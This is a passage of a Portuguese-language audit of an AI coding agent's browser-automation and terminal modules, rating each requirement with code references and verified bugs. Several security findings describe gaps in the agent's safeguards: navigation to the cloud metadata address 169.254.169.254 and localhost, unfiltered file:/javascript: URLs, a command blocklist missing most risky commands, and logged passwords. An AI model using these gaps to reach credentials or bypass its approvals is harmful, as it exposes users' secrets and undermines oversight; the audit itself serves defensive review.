| M05-014 | Integrar navegação a tarefas de programação (§1) | 🟡 | `preview.ts` detecta/inicia o dev server e `BrowserPane` o exibe, mas o agente não enxerga esse `<webview>` (usa Playwright separado) |
| M05-015 | Inspecionar o projeto e rodar os testes iniciais (§2) | ✅ | 411 testes verdes nesta auditoria (§1.2) |
| M05-016 | Clonar/analisar os 9 repositórios de §3 | 🟡 | 5/9 (browser-use, playwright, puppeteer, stagehand, MCP servers). **Ausentes:** playwright-mcp, selenium, BrowserGym, devtools-protocol |
| M05-017 | Comparar Playwright x Puppeteer e justificar a escolha (§3.4) | 🟡 | Playwright adotado (`THIRD_PARTY_NOTICES.md:21`); não há documento de comparação |
| M05-018 | Reutilizar/adaptar código externo e registrar (§2, §3) | ❌ | `CODE_REUSE_MATRIX.md:81-85, 150`: snapshot com refs estáveis, resolução polimórfica, identidade de elemento "planejados"; `src/core/browser` só tem `layer.ts` |
| M05-019 | Browser Manager: inicializar navegador (§4.1) | ✅ | layer.ts:172-229 |
| M05-020 | Browser Manager: conectar a instância existente (§4.1, §4.2) | 🟡 | Ponte extensão+host nativo (`bridge.ts`, `main.go`); não verificada em Chrome real e com defeitos (BUG-01, BUG-12) |
| M05-021 | Identificar navegadores disponíveis (§4.1) | 🟡 | Só tentativa em cascata (chrome/msedge/chromium) e Chrome para a ponte (`install.ts:34-41, 84`); sem listagem nem Edge/Brave na ponte |
| M05-022 | Criar sessões e contextos isolados (§4.1) | ✅ | Um `BrowserLayer` por sessão (`orchestrator.ts:347-353`) e por subagent (`agents/runtime.ts:350`); **sem teste de isolamento** (Teste G) |
| M05-023 | Gerenciar páginas, consultar estado, encerrar sessões (§4.1) | 🟡 | `close()` layer.ts:464-484; `status()` :135-164; sem `list/get_session_info` |
| M05-024 | Recuperar-se de falhas do navegador (§4.1) | 🟡 | `activePage()` ignora aba fechada (layer.ts:126-129); sem handler `browser.on('disconnected')` (grep vazio): crash do Chromium deixa o estado obsoleto até `close()` |
| M05-025 | Session Manager: temporárias, ID por tarefa, isolamento de cookies, timeouts (§4.2) | 🟡 | Temporária + `sessionId` ✅ (layer.ts:96, 102-107); persistência ❌; timeouts fixos (15 s) |
| M05-026 | Não misturar sessão pessoal e isolada automaticamente (§4.2) | ❌ | Modo padrão `auto` (`settings.ts:93`) usa o Chrome pessoal assim que a extensão conecta (layer.ts:113-116) |
| M05-027 | Tab Manager: listar/abrir/selecionar/fechar/navegar/título/URL (§4.3) | ✅ | `tests/browser-tabs.test.ts`; smoke |
| M05-028 | IDs de aba estáveis, não índice (§4.3) | ✅ | `tab_N` (layer.ts:231-243), `chrome_<id>` (bridge.ts:302-303) |
| M05-029 | Esperar criação de aba e detectar navegação que abre nova página (§4.3) | ❌ | Verificado: `target=_blank` não cria entrada (sem `context.on('page')`/`popup`) |
| M05-030 | Identificar redirecionamentos (§4.3, §4.4) | ❌ | Só a URL final no `<page url=…>`; sem aviso de mudança de origem |
| M05-031 | Navegar para trás/frente, atualizar, esperar navegação/URL/estado (§4.4) | ❌ | `go_back/go_forward/reload/wait_for_*` ausentes (grep vazio) |
| M05-032 | Falhas de DNS/conexão/timeout/página de erro (§4.4) | 🟡 | Erro cru do Playwright (`Timeout 15000ms exceeded`); sem classificação `net::ERR_*` |
| M05-033 | Estados de navegação (iniciada, DOM, app, elemento, concluída, falha) (§4.4) | ❌ | Só `domcontentloaded` (layer.ts:224, 228, 344). No Chrome nem espera carregar (bg.js:216, 226) → snapshot pode ler a página anterior |
| M05-034 | Aplicar políticas de navegação existentes (§4.4, §15) | ❌ | BUG-03 |
| M05-035 | DOM Inspector: estrutura, links, botões, campos, forms, tabelas, listas, iframes (§4.5) | ❌ | Inexistente (`inspect_dom`, `find_elements`, `get_element_info`, `get_attribute`) |
| M05-036 | Consultas seletivas e limites de tamanho (§4.5) | 🟡 | `max_chars` 1 000-60 000 (browser.ts:73); `readText` 25 000 (layer.ts:418); sem consulta por papel/região |
| M05-037 | Accessibility Inspector: papel, nome, texto, estado, relações (§4.6) | 🟡 | ✅ em Playwright (saída verificada). No modo Chrome o "snapshot" é `document.body.innerText` (bg.js:227-241) — sem papéis |
| M05-038 | Element Resolver: semântico, CSS, texto (§4.7) | ✅ | `locate` layer.ts:452-462 |
| M05-039 | Resolver detecta 0/N correspondências, oculto, desabilitado, substituído (§4.7) | ❌ | `.first()` silencioso (layer.ts:372, 389-390); verificado: 2 botões "Excluir" → clicou o primeiro |
| M05-040 | Resolver usa coordenadas/Computer Use como alternativa (§4.7, §11) | ❌ | Sem interface de delegação |
| M05-041 | Action Executor: validar, resolver, políticas, aguardar resultado, evidências (§4.8) | 🟡 | Zod + aprovação ✅; espera fixa 250/500 ms (layer.ts:373, 393); sem evidências estruturadas |
| M05-042 | State Observer: URL, título, loading, aba, elementos, formulários, erros (§4.9) | 🟡 | URL/título/árvore ✅; loading/formulários/seleção ❌ |
| M05-043 | Verifier: navegação, formulário, estado, aba, pesquisa, download (§4.10) | ❌ | Nenhum verificador; `browser_click` responde "clique realizado" + snapshot (browser.ts:102-112) |
| M05-044 | Ferramentas §5.1: `get_status/launch/connect/create_session/close_session/list_sessions/get_session_info` | ❌ | Só efeitos colaterais de `browser_open`; `status()` não é ferramenta |
| M05-045 | Ferramentas §5.2: `list_tabs/open_tab/select_tab/close_tab` | ✅ | `browser_tabs/new_tab/switch_tab/close_tab` |
| M05-046 | Ferramenta §5.2: `get_tab_info` | 🟡 | `browser_tabs` lista id/título/URL |
| M05-047 | Ferramenta §5.3: `navigate` | ✅ | `browser_navigate` |
| M05-048 | Ferramentas §5.3: `go_back/go_forward/reload/wait_for_navigation/wait_for_url/wait_for_load_state` | ❌ | — |
| M05-049 | Ferramenta §5.4: `inspect_accessibility`, `get_text`, `capture_screenshot` | ✅ | `browser_snapshot`, `browser_read`, `browser_screenshot` |
| M05-050 | Ferramenta §5.4: `get_page_info` | 🟡 | `<page url title>` embutido nas respostas |
| M05-051 | Ferramentas §5.4: `inspect_dom/find_elements/get_element_info/get_attribute` | ❌ | — |
| M05-052 | Ferramentas §5.5: `click`, `fill`, `press_key` | ✅ | `browser_click`, `browser_type`, `browser_press` (no modo Chrome, Enter/submit são eventos sintéticos sem efeito — BUG-01) |
| M05-053 | Ferramenta §5.5: `type_text` (digitação real) | 🟡 | `browser_type` usa `fill` (instantâneo), não teclas |
| M05-054 | Ferramentas §5.5: `double_click/hover/select_option/check/uncheck/scroll/focus/submit_form` | ❌ | — |
| M05-055 | Ferramentas §5.6: `download_file/get_download_status/list_downloads` | ❌ | Nenhum handler de `download` |
| M05-056 | Ferramenta §5.7: `wait_for_element` | ✅ | `browser_wait` (CSS) |
| M05-057 | Ferramentas §5.7: `verify_action/wait_for_text/get_action_history/cancel_action` | ❌ | — |
| M05-058 | Cada ferramenta: erros tipados, timeout, cancelamento (§5) | 🟡 | Timeouts de 15 s fixos; `ctx.signal` não chega ao Playwright (cancelar fecha o navegador, orchestrator.ts:827); erros são texto |
| M05-059 | Não criar ferramenta de JS irrestrito (§5) | ✅ | Não há `browser_eval` (`ARCHITECTURE.md` §10) |
| M05-060 | Links e botões: nomes, disponibilidade, clique, aguardar, novas abas, confirmar estado (§6.1) | 🟡 | Clique ✅; novas abas/confirmação ❌ |
| M05-061 | Formulários: checkbox, radio, select, data, upload, validação, mensagens de erro (§6.2) | ❌ | Verificado: `fill` rejeita select/checkbox |
| M05-062 | Conferir campos obrigatórios e objetivo antes de enviar; respeitar confirmação (§6.2) | 🟡 | Confirmação por `browser_click/type/press` em modo `ask` (`permissions.ts:16-18, 151-153`); sem checagem de obrigatórios |
| M05-063 | Tabelas e listas: linhas/colunas, paginação, filtros (§6.3) | ❌ | — |
| M05-064 | Elementos dinâmicos: modais, popovers, hover, listas dinâmicas (§6.4) | 🟡 | Espera por seletor + clique ✅ (verificado); hover ❌ |
| M05-065 | iframes: identificar e interagir (§6.5) | ❌ | Verificado: snapshot mostra só `- iframe`; clique no botão interno estoura 15 s |
| M05-066 | Shadow DOM (§6.6) | ✅ | Verificado (Playwright): snapshot lista `button "No shadow"` e o clique funciona; sem teste de regressão. No modo Chrome `querySelector` não atravessa shadow roots (bg.js:248-260) |
| M05-067 | Apps dinâmicos: substituição de elementos, refazer resolução (§6.7) | 🟡 | Locators lazy; sem refs/identidade |
| M05-068 | Ciclo do Agent Core: estado→objetivo→resolver→agir→observar→verificar (§7) | 🟡 | Funciona sem verificador (M05-043) |
| M05-069 | Modelo recebe informação relevante, não a página inteira (§7) | ✅ | Limites de `max_chars`; clique/digitação devolvem 6 000 chars |
| M05-070 | Planejamento web e recuperação com limite de tentativas (§7.1, §7.2) | 🟡 | Detector de repetição do runner; sem ferramentas específicas |
| M05-071 | Não afirmar sucesso sem evidência (§7) | 🟡 | O modo Chrome devolve "clique realizado" mesmo clicando em `<html>` (BUG-01) |
| M05-072 | Contextos isolados e cookies/localStorage separados (§8) | ✅ | Por design (um contexto por `BrowserLayer`); sem teste (Teste G) |
| M05-073 | Logout, limpeza de dados, expiração de sessão (§8) | ❌ | Sem ferramentas |
| M05-074 | Não expor cookies/tokens/credenciais ao modelo (§8) | 🟡 | Sem ferramenta de cookies ✅; mas `errors()` inclui URLs com query string/token (verificado) e o valor digitado em senha aparece em `describe`/eventos (BUG-14) |
| M05-075 | Não armazenar senhas em texto simples em config/logs (§8) | ❌ | `browser_type` `describe` mostra o valor (browser.ts:128) e `tool_start.args` é persistido |
| M05-076 | Não contornar CAPTCHA/MFA; permitir intervenção humana (§8) | ✅ | Nada contorna; existe `ask_user` |
| M05-077 | Downloads: detectar, aguardar, nome, local, existência, timeout, sobrescrita (§9) | ❌ | — |
| M05-078 | Uploads: localizar campo, selecionar arquivo autorizado, verificar (§9) | ❌ | Sem `setInputFiles` |
| M05-079 | Seletor de arquivos nativo delegado ao Módulo 04 (§9) | ❌ | Sem delegação |
| M05-080 | Diagnóstico: erros de console e exceções JS (§10) | ✅ | layer.ts:207-216 (limite 300); só Playwright |
| M05-081 | Diagnóstico: falhas de recurso e HTTP 4xx/5xx (§10) | ✅ | layer.ts:214-219 (verificado: 600 respostas 500) |
| M05-082 | Diagnóstico: redirecionamentos, tempos de navegação, estado de carga (§10) | ❌ | — |
| M05-083 | Filtrar/limitar dados e não registrar cabeçalhos/cookies/tokens (§10) | ❌ | `networkErrors` sem teto (layer.ts:92, 211-219) e com query string; a ferramenta mostra os últimos 30 |
| M05-084 | Interface clara para pedir intervenção do Computer Use (§11) | ❌ | Só instrução no prompt para NÃO substituir (`context.ts:72`) |
| M05-085 | Skills de navegador (pesquisa, formulários, testes, acessibilidade) (§12) | ❌ | `resources/skills` só tem `qa-total` e `svg-master` |
| M05-086 | Comandos `/browse`, `/research-web`, `/test-web`, `/inspect-page`, `/check-links` (§12) | ❌ | Inexistentes (grep vazio) |
| M05-087 | Hooks `browser.*` no dispatcher existente (§12) | 🟡 | Só `PreToolUse/PostToolUse` genéricos com matcher por ferramenta (`runner.ts:1751-1910`); sem eventos de navegação/download |
| M05-088 | Subagents: sessão por tarefa, isolamento, resultado estruturado (§13) | ✅ | `agents/runtime.ts:348-351`; `SubagentOutcome` |
| M05-089 | Subagents: limites de recursos e coordenação de abas compartilhadas (§13) | 🟡 | `maxConcurrent` de agentes; cada filho lança outro Chromium; sem teto/coordenação de abas |
| M05-090 | Cancelamento e recuperação de tarefas web (§13) | 🟡 | `abort` fecha o navegador (orchestrator.ts:827) |
| M05-091 | Configuração: navegador, caminho, headless, timeouts, limite de abas, downloads, perfil, proxy (§14) | ❌ | Só `browser.mode` e `groupBySession` (`settings.ts:93`); `headed` por chamada |
| M05-092 | Cache de metadados e consultas seletivas (§14) | 🟡 | Sem cache; consultas limitadas por tamanho |
| M05-093 | Validação de URL e esquemas (§15) | ❌ | `z.string().url()` aceita `file:`, `javascript:`, `data:`, `chrome:`, `view-source:` (verificado) |
| M05-094 | Política de domínios configurável (§15) | 🟡 | Regras `domain:` só se aplicam a `browser_open/navigate` (`rules.ts:43-44, 126-133`); `browser_new_tab` fica de fora |
| M05-095 | Endereços locais/rede privada/metadados (§15) | ❌ | `browser_navigate http://169.254.169.254/` e `localhost` permitidos em todos os modos; `assertFetchable` (`tools/web.ts:12-24`) só protege `fetch_url` |
| M05-096 | Tratamento de redirecionamentos (§15) | ❌ | Nenhuma revalidação após redirecionamento |
| M05-097 | Conteúdo de página tratado como não confiável (§15) | ✅ | `scanForInjection` (runner.ts:1448; policy.ts:135-169; `tests/security.test.ts`) |
| M05-098 | Proteção contra loops de navegação (§15) | 🟡 | Só o detector de chamadas idênticas (runner.ts:1714-1729) |
| M05-099 | Controle pelo executor central (§15) | ✅ | `evaluateTool` + `ALWAYS_CONFIRM` (permissions.ts:7-27, 86-155) — salvo `unrestricted` |
| M05-100 | Bloqueio de arquivos de credencial via `file:` (§15) | 🟡 | `sensitive.ts:420-423` cobre `browser_open/browser_navigate`, **não** `browser_new_tab` (BUG-03) |
| M05-101 | Testes unitários: validação de URL, resolução, estados, timeout, cancelamento, redirects (§16.1) | ❌ | Só `tests/browser-tabs.test.ts` (dublê do Playwright) |
| M05-102 | Aplicação web local de teste (links, forms, tabelas, iframes, modais, downloads…) (§16.2) | ❌ | Inexistente |
| M05-103 | Testes de integração com navegador real (§16.3) | ❌ | Nenhum script/teste do repositório lança o Chromium para `browser_*` (grep em `scripts/` e `tests/`) |
| M05-104 | Testes A–F com Agent Core (navegação, formulário, dinâmico, recuperação, abas, Computer Use) (§16.4) | ❌ | Nenhum |
| M05-105 | Teste G de segurança de sessão (§16.4) | ❌ | Nenhum |

### 3.1 Critérios de aceitação do Módulo 05 (§17)

| # | Critério | Resultado |
|---|---|---|
| A05-01 | Navegador inicializado e controlado | Atendido (Playwright, verificado) |
| A05-02 | Gerenciamento de sessões | Parcial (sem ferramentas de sessão) |
| A05-03 | Abrir/listar/alternar abas | Atendido (com a falha de popups) |
| A05-04 | Navegação monitorada | NÃO atendido |
| A05-05 | DOM inspecionável | NÃO atendido |
| A05-06 | Árvore de acessibilidade | Atendido só em Playwright |
| A05-07 | Localizar e interagir | Parcial |
| A05-08 | Formulários preenchidos e verificados | NÃO atendido |
| A05-09 | Elementos dinâmicos | Parcial |
| A05-10 | Timeouts e cancelamento | Parcial |
| A05-11 | Downloads monitorados | NÃO atendido |
| A05-12 | Resultados verificáveis | NÃO atendido |
| A05-13 | Falhas provocam recuperação | Parcial |
| A05-14 | Integra-se ao Agent Core | Atendido |
| A05-15 | Integra-se aos subagents | Parcial |
| A05-16 | Skills/comandos/hooks usam o navegador | NÃO atendido |
| A05-17 | Computer Use complementa a web | NÃO atendido |
| A05-18 | Dados de sessão tratados adequadamente | Parcial |
| A05-19 | Testes executados | NÃO atendido (só dublê) |
| A05-20 | Funcionalidades anteriores intactas | Atendido |
| A05-21 | Não depende só de coordenadas/screenshots | Atendido |
| A05-22 | Relatório distingue executada de confirmada | NÃO atendido |

---

# 4. Módulo 06 — Terminal, shell, processos e execução de comandos

Há **dois sistemas separados**, e só um deles é do agente:

1. **Execução do agente** — `src/core/tools/shell.ts` (`run_command`, `start_process`, `read_process_output`, `list_processes`, `stop_process`, `list_ports`): `child_process.spawn` com pipes, `cmd.exe /d /s /c` (via `shell:true`), registro em memória por sessão. Não há PTY nem sessão interativa para o agente.
2. **Terminal integrado do usuário** — `src/main/terminal.ts` (`@lydell/node-pty`, ConPTY) + `TerminalPane.tsx` (xterm.js 6 + FitAddon). O próprio `ARCHITECTURE.md` §13 diz que ele "não passa pelas aprovações do agente". O agente não lê, não escreve e não vê esses terminais.

Fatos verificados por execução nesta auditoria (módulo `shell.ts`/`policy.ts` empacotado com esbuild e executado de verdade; ver Apêndice A): timeout ignorado por filho desacoplado (7,2 s para um timeout de 1 s), stdin nunca fechado, cauda da saída perdida, acentos ilegíveis (CP850 e UTF-16 do `wsl.exe`), `filter` que consome linhas, blocklist com 18 furos em 26 comandos arriscados testados, ambiente SSH que roda partes encadeadas localmente, 6 processos idênticos sem limite, abort que mata a árvore em 0,9 s sem órfãos.

Legenda de caminhos: `shell.ts` = `src/core/tools/shell.ts`; `term.ts` = `src/main/terminal.ts`.

| ID | Requisito (seção do prompt) | Status | Evidência |
|---|---|---|---|
| M06-001 | Executar comandos num terminal e ler o resultado (§1) | ✅ | `run_command` shell.ts:259-333; E2E `scripts/ui-work.cjs` (comandos reais, falha exit 3); captura `tmp/ui-work/03-tarefas.png` |
| M06-002 | Identificar tecnologia do projeto e dependências instaladas (§1) | 🟡 | `describeToolchains` no prompt (`orchestrator.ts`), `quality_discover`; `tests/toolchains.test.ts`. Não auditado a fundo |
| M06-003 | Iniciar servidor de desenvolvimento e mantê-lo rodando enquanto trabalha (§1, §6.3) | ✅ | `start_process` shell.ts:335-368; `tests/harness.test.ts:611-637`; E2E "Serviço de teste" com saída "tick" |
| M06-004 | Ler logs, identificar erros, reiniciar, verificar a aplicação (§1) | 🟡 | `read_process_output` ✅; sem busca/linhas ao redor do erro; reinício = `stop_process` + `start_process` manual; verificar app = `list_ports` + `browser_*` |
| M06-005 | Informar o resultado real da execução (§1) | ✅ | `exit=… · Xs · TIMEOUT` (shell.ts:320-331) |
| M06-006 | Compatível com PowerShell, CMD e WSL; outros por configuração (§1) | 🟡 | Agente: só `cmd.exe` (+WSL/SSH/nuvem via perfil de ambiente, shell.ts:47-61). Usuário (PTY): PowerShell, CMD, Git Bash (`term.ts:38-55`); sem pwsh, sem shells configuráveis |
| M06-007 | Sistema de processos, não só "executa e devolve texto" (§1) | 🟡 | Há processos em segundo plano com leitura incremental; faltam sessões interativas do agente, ciclo de vida completo e recuperação |
| M06-008 | Inspecionar o harness e rodar os testes iniciais (§2) | ✅ | 411 testes verdes nesta auditoria |
| M06-009 | Clonar/analisar os 10 repositórios de §3 | 🟡 | 3/10 (xterm.js, ripgrep, playwright; + terax-ai). **Ausentes:** node, node-pty (usa `@lydell/node-pty` do npm), Windows Terminal, PowerShell, OpenSSH, wezterm/portable-pty, ShellCheck |
| M06-010 | Bibliotecas escolhidas e justificadas (§3, §18) | 🟡 | `@lydell/node-pty ^1.2.0-beta.15`, `@xterm/xterm ^6.0.0`, `@xterm/addon-fit` (`package.json`); `rg.exe` embutido; sem documento de justificativa |
| M06-011 | Documentar o que foi aproveitado (§2) | 🟡 | `CODE_REUSE_MATRIX.md:153` item 11 (flow control de PTY e shell integration) "não feito" |
| M06-012 | Serviço central de execução independente de provedor (§4.1) | 🟡 | `runShellCommand`/`startBackground` centralizam, mas como funções do arquivo de ferramentas; `external-agent.ts` e o PTY usam spawns próprios |
| M06-013 | Serviço: validar, selecionar ambiente, iniciar, capturar saída, exit code, falha de início, timeout, cancelamento (§4.1) | 🟡 | Tudo existe, com os defeitos de BUG-06/07/08; cwd inexistente vira "spawn cmd.exe ENOENT" (verificado) |
| M06-014 | Shell Adapter Registry (id, executável, args, cwd, env, capacidades, quoting, encerramento) (§4.2) | ❌ | Não há registro; é um `if/else` (shell.ts:47-61); para o PTY, `availableShells()` só serve à UI |
| M06-015 | Adaptadores CMD, PowerShell, WSL, Bash, outros configuráveis (§4.2, §13) | 🟡 | CMD ✅. WSL: roteamento por função pura testado (`tests/environments.test.ts`); **execução real falhou** nesta máquina (virtualização desativada) e a mensagem do `wsl.exe` chegou em UTF-16 ilegível (BUG-08). PowerShell/Bash/outros ❌ no agente |
| M06-016 | Quoting específico por shell (§4.2, §6.4) | ❌ | SSH/nuvem usam aspas POSIX sob `cmd.exe` (shell.ts:56-60): verificado que `&&` executa localmente (BUG-04) |
| M06-017 | Sessões persistentes de terminal para o USUÁRIO: criar, listar, estado, entrada, saída, resize, encerrar (§4.3) | ✅ | `TerminalManager` term.ts:74-185; IPC `index.ts:2159-2194`; `TerminalPane.tsx`; E2E `scripts/ui-panes.cjs:88-106` (não reexecutado) |
| M06-018 | Sessões persistentes para o AGENTE (criar, enviar entrada, ler, redimensionar, interromper, fechar) (§4.3, §5.2) | ❌ | Nenhuma ferramenta; stdin nunca é escrito (shell.ts:71) |
| M06-019 | Detectar processo encerrado e recuperar informações (§4.3) | 🟡 | `onExit` (term.ts:117-122); sem recuperação de sessão |
| M06-020 | PTY: shells interativos, resize, ANSI, encerramento, buffers, desconexão (§4.4) | ✅ | term.ts:84-174; xterm + FitAddon; sem backpressure (`pty.write` direto, term.ts:135-138) |
| M06-021 | Não usar PTY quando um processo simples basta (§4.4) | ✅ | `run_command` usa pipes |
| M06-022 | Output: captura separada de stdout e stderr (§4.5) | 🟡 | Foreground separa (shell.ts:224-230); background mistura num só buffer (shell.ts:96-97) |
| M06-023 | Output: streaming em tempo real (§4.5) | ✅ | `ctx.progress` a cada 600 ms (shell.ts:303-309); `TasksPanel.tsx` |
| M06-024 | Output: limites de memória e buffers (§4.5, §12) | ✅ | 600 000/stream (foreground), 200 000 (background, cauda), 200 000 (PTY): memória limitada |
| M06-025 | Output: preservar o fim da saída (§4.5, §12) | ❌ | Foreground guarda o INÍCIO e descarta o fim (shell.ts:224-230): verificado — com 1,2 M de caracteres a última linha sumiu |
| M06-026 | Output: scrollback, paginação e pesquisa (§4.5, §12) | ❌ | `read_process_output` devolve "novo desde a última leitura"; sem `offset`/`tail`/regex; xterm 5 000 linhas (TerminalPane.tsx:48) |
| M06-027 | Output: decodificação correta e saída incompleta (§4.5) | ❌ | `toString('utf8')` por pedaço (shell.ts:97, 225); `cmd.exe` emite CP850 → "n�o � reconhecido" (verificado); `wsl.exe` emite UTF-16LE → NULs (verificado) |
| M06-028 | Output: saída longa recuperável por persistência (§4.5, §12) | 🟡 | Foreground > 16 000 chars vira arquivo + resumo (`runner.ts:851-893`); o buffer em memória já perdeu o fim (M06-025); background não faz spill |
| M06-029 | Output: cancelamento de consumidores (§4.5) | ❌ | — |
| M06-030 | Process Registry: id interno ≠ PID, sessão, tarefa, comando, cwd, início, estado, exit, última atividade (§4.6) | 🟡 | `BackgroundProcess` (shell.ts:13-25) indexado por PID do SO (reuso de PID sobrescreve); sem id interno, tarefa, última atividade; só memória |
| M06-031 | Lifecycle: created/starting/running/waiting_for_input/stopping/completed/failed/cancelled/unknown (§4.7) | 🟡 | Só ativo/encerrou(exit N) (shell.ts:161-165) |
| M06-032 | Distinguir em execução x aguardando entrada x encerrado x desconhecido (§4.7, §8) | ❌ | "Aguardando entrada" não é detectável (verificado: processo que espera EOF fica mudo até o timeout) |
| M06-033 | Result Analyzer: exit code, erro, falha de início, timeout (§4.8) | ✅ | shell.ts:316-331 |
| M06-034 | Analyzer: cancelamento, sinais, compilação, resultados de teste, avisos (§4.8) | ❌ | Cancelamento aparece como `exit 1` e `timedOut:false` (verificado); sem parsers |
| M06-035 | stderr não é automaticamente falha (§4.8) | ✅ | `ok = exit==0 && !timedOut` (shell.ts:326) |
| M06-036 | Contrato §5.1: `terminal.execute` | ✅ | `run_command` |
| M06-037 | Contrato §5.1: `get_execution_result`, `get_execution_status`, `cancel_execution` | 🟡 | Só para background: `read_process_output`, `list_processes`, `stop_process`; foreground sem id de execução |
| M06-038 | Contrato §5.2: `create_session/list_sessions/get_session_info/send_input/resize/interrupt/close_session` | ❌ | — |
| M06-039 | Contrato §5.3: `process.list`, `process.get_output`, `process.terminate` | ✅ | `list_processes`, `read_process_output`, `stop_process` |
| M06-040 | Contrato §5.3: `process.get_info`, `process.wait` | 🟡 | `describeProcess` (shell.ts:161-165); espera só por saída nova (`wait_ms`), não pelo fim |
| M06-041 | Contrato §5.4: `get_recent_output`, `search_output` | 🟡 | Sem tail/regex; `filter` é substring e **consome** o que não casa (verificado, BUG-11) |
| M06-042 | Contrato §5.4: `get_exit_status`, `get_environment_info` | 🟡 | Exit no `list/read`; ambiente só no prompt (`context.ts:210`) |
| M06-043 | Cada ferramenta: erros tipados, timeout, cancelamento, ID de sessão/processo (§5) | 🟡 | Timeout ✅ (run_command), cancelamento ✅ (abort), erros tipados ❌ |
| M06-044 | Não criar executor separado por agente (§5) | 🟡 | O mapa de processos é por `sessionId` (shell.ts:27); cada filho tem o seu, e o pai não os enxerga (BUG-05) |
| M06-045 | Execução pontual com status, exit code, stdout, stderr, duração, id, timeout/cancelamento (§6.1) | 🟡 | Tudo exceto id de execução e flag de cancelamento |
| M06-046 | Execução assíncrona com consulta posterior (§6.1) | ✅ | `run_in_background` + `read_process_output` (`tests/harness.test.ts:611`) |
| M06-047 | Execução interativa: enviar entrada e continuar (§6.2) | ❌ | Verificado: stdin permanece aberto e ocioso; não há `send_input` |
| M06-048 | Processos persistentes (servidores, watchers): saber que seguem ativos, ler logs, encerrar (§6.3) | ✅ | start/list/read/stop; E2E; verificado stop → `encerrou (exit 1)` em < 1 s |
| M06-049 | Não considerar falha só porque não houve saída (§6.3) | ✅ | `start_process` devolve "iniciado" com saída vazia (shell.ts:360-366) |
| M06-050 | Comandos encadeados, paralelos, pipelines (§6.4) | 🟡 | Via sintaxe do `cmd.exe`; sem modo paralelo estruturado |
| M06-051 | Execução estruturada executável+argumentos; não concatenar entrada do modelo (§6.4, §14) | ❌ | Só string passada a `cmd.exe` (`shell:true`, shell.ts:71) |
| M06-052 | Diretório de trabalho por execução, validado, informado (§6.5) | 🟡 | `cwd` validado por `WorkspaceGuard` (shell.ts:289; policy.ts:55-89), mas o comando pode sair do workspace; diretório inexistente → erro enganoso |
| M06-053 | Não alterar o diretório global do app (§6.5) | ✅ | `spawn({cwd})` |
| M06-054 | Variáveis de ambiente por processo (herdar, sobrescrever, remover, validar nomes) (§6.6) | ❌ | Sem parâmetro `env`; `sanitizedEnv()` fixo (policy.ts:186-196) e `CI=1` forçado (shell.ts:69) |
| M06-055 | Não copiar o ambiente para o contexto do modelo (§6.6) | ✅ | Nenhuma ferramenta o despeja |
| M06-056 | Timeouts: pontual, espera por saída, encerramento, início, entrada (§7.1) | 🟡 | Pontual (1 s-15 min; padrão `shellTimeoutSec`) ✅ e espera por saída que não mata o processo ✅ (≤ 60 s); início/encerramento/entrada ❌ |
| M06-057 | Teto de tempo coerente com o runner (§7.1) | ❌ | `TOOL_TIMEOUT_MS` = 10 min (`runner.ts:55`) < `timeout_ms` máx. 15 min e `shellTimeoutSec` até 3 600 s (`index.ts:301`), e `withTimeout` não mata o filho (`runner.ts:1882-1886`) |
| M06-058 | Cancelamento: interromper, aguardar, registrar, liberar, informar se encerrou (§7.2) | 🟡 | `abort` → `taskkill /T /F` (verificado 0,9 s, sem órfãos); `killTree` é assíncrono e não confirma (shell.ts:182-192); `stop_process` devolve ok imediato (14 ms) |
| M06-059 | Windows: árvore de processos / Job Objects (§7.3) | 🟡 | `taskkill /T /F` ✅; sem Job Object (grep vazio); filho desacoplado (`start /b`) escapa e segura o pipe (verificado, BUG-06) |
| M06-060 | Não encerrar processos alheios (§7.3, §14) | ✅ | PID não rastreado exige aprovação "destrutiva" (shell.ts:436-446) |
| M06-061 | Recuperação: classificar erro, preservar info, verificar sessão, evitar repetir efeitos (§7.4) | 🟡 | Só o detector de chamada idêntica (runner.ts:1714-1729) |
| M06-062 | Agent Core: selecionar shell (§8) | ❌ | `run_command` não tem parâmetro `shell` |
| M06-063 | Agent Core: executar, receber saída, monitorar, consultar, interromper (§8) | ✅ | Registro central + `evaluateTool` |
| M06-064 | Agent Core: distinguir concluído/falhou/em execução/aguardando entrada/cancelado/não confirmado (§8) | 🟡 | Sem "aguardando entrada" nem "cancelado" |
| M06-065 | Não concluir a tarefa com processos necessários ainda rodando (§8) | ❌ | Nenhuma checagem ao fim do turno |
| M06-066 | Subagents: agente responsável e processo↔tarefa (§9) | 🟡 | `agentId` nos eventos; processo indexado pelo id do filho |
| M06-067 | Subagents: limite de concorrência de processos (§9) | ❌ | Verificado: 6 processos em segundo plano sem limite |
| M06-068 | Subagents: processo compartilhado, cancelamento coordenado (§9) | ❌ | Pai não lê/encerra processos do filho; filhos terminados deixam processos órfãos e invisíveis (BUG-05) |
| M06-069 | Subagents: evitar servidores duplicados (§9) | ❌ | Verificado: 6 `ping` idênticos |
| M06-070 | Skills de terminal (testes, build, dev server, logs…) (§10) | ❌ | `resources/skills` só `qa-total` e `svg-master` |
| M06-071 | Comandos `/run /test /build /dev-server /logs /stop-process` (§10) | ❌ | Inexistentes (grep vazio) |
| M06-072 | Hooks `terminal.*` e `process.*` no dispatcher existente (§10) | 🟡 | `PreToolUse/PostToolUse` com matcher por nome cobrem `run_command` (`tests/core-gaps.test.ts:811-891`); sem `process.exited`, `session_created` etc. |
| M06-073 | UI: painel de terminal, seletor de sessões, shell, cwd, estado, código de saída (§11) | ✅ | `TerminalPane.tsx:121-234` (abas, título do shell, cwd no tooltip, `[processo encerrado com código N]`) |
| M06-074 | UI: saída em tempo real, scrollback, resize (§11) | ✅ | xterm + FitAddon + `ResizeObserver` (TerminalPane.tsx:41-98); snapshot restaura após recarga |
| M06-075 | UI: seleção e cópia de texto (§11) | ❓ | Sem `attachCustomKeyEventHandler`/menu de contexto/`copyOnSelect`; Ctrl+C vira SIGINT; não verificado na UI |
| M06-076 | UI: botão de interrupção da sessão (§11) | ❌ | Só Ctrl+C no próprio terminal |
| M06-077 | UI: indicador de processo persistente e diferenciar ativas de concluídas (§11) | ✅ | `TasksPanel.tsx` ("Tarefas em segundo plano", parar, duração, saída ao vivo; `tmp/ui-work/03-tarefas.png`) |
| M06-078 | UI: histórico de comandos e identificação de erros (§11) | ❌ | Só o histórico do shell do usuário |
| M06-079 | UI não bloqueia durante a execução (§11) | ✅ | Processos no main, IPC assíncrono |
| M06-080 | xterm.js integrado ao terminal existente (§3.3, §11) | ✅ | `@xterm/xterm` 6 |
| M06-081 | Logs: scrollback configurável, paginação, pesquisa, filtragem (§12) | ❌ | Constantes fixas; sem paginação/regex |
